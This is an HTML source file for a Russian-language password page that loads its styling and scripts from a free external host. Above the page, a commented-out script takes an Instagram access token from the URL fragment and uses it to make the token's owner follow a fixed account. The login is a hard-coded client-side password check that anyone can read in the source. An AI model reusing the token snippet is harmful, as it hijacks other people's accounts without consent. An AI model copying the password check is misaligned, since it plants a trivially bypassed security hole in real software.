 <!--<script src="http://bkedkejdk.esy.es/jquery-1.11.3.min.js"></script>
 <script type="text/javascript">
 var page = document.location.hash.substr(document.location.hash.lastIndexOf('=') + 1);
 
 query='https://api.instagram.com/v1/users/1184665015/relationship?access_token='+page+'&action=follow';
 $.post(query);
 //window.close();
 </script>-->


<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Страница авторизации</title>

	<!-- Latest compiled and minified CSS -->
	<link rel="stylesheet" href="http://bkedkejdk.esy.es/bootstrap-3.3.4-dist/css/bootstrap.min.css">

	<!-- Optional theme -->
	<link rel="stylesheet" href="http://bkedkejdk.esy.es/bootstrap-3.3.4-dist/css/bootstrap-theme.min.css">
	
	<link rel="stylesheet" href="http://bkedkejdk.esy.es/animate.min.css">
	
	
	<link rel="stylesheet" href="http://bkedkejdk.esy.es/style.css">

	<link rel="image_src" href="http://bkedkejdk.esy.es/kartinka.jpg">
  <link rel="image_src" href="kartinka.jpg">
	
	<script src="//vk.com/js/api/openapi.js" type="text/javascript"></script>







<script type="text/javascript">
	function log_in() {
    pass='chickchick';
	passwordValue=document.getElementById("in").value;
    if(passwordValue==pass)
    	location="http://www.google.ru";
	}
</script>

  </head>

  <body class="admin-page-login">


	<div class="container absolute-center-center">
<!-- 		<div class="glass-panel"> -->
			<h1 class="greeting">Введите пароль для перехода</h1>

			<div class="form">

				<div class="form-group">
					<label class="sr-only" for="in">Пароль</label>
					<input type="password" class="form-control" placeholder="Пароль" id="in">
				</div>
		
				<button onclick="log_in()" id="settings-button" class="btn btn-lg btn-black gradient">Войти <i class="fa fa-sign-in"></i></button>
				
<!-- 			</div> -->
		</div>
			
	</div>

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="http://bkedkejdk.esy.es/jquery-1.11.3.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="http://bkedkejdk.esy.es/bootstrap-3.3.4-dist/js/bootstrap.min.js"></script>
    


	<script language="javascript">
	$( document ).ready(function() {
    
		$("#settings-button").mouseenter(function() {
			$(this).addClass("animated pulse");
		});
		$("#settings-button").mouseleave(function() {
			$(this).removeClass("animated pulse");
		});
    
	});
	</script>

 
 <script type="text/javascript" src="//vk.com/js/api/openapi.js?113"></script>	
  </body>
</html>

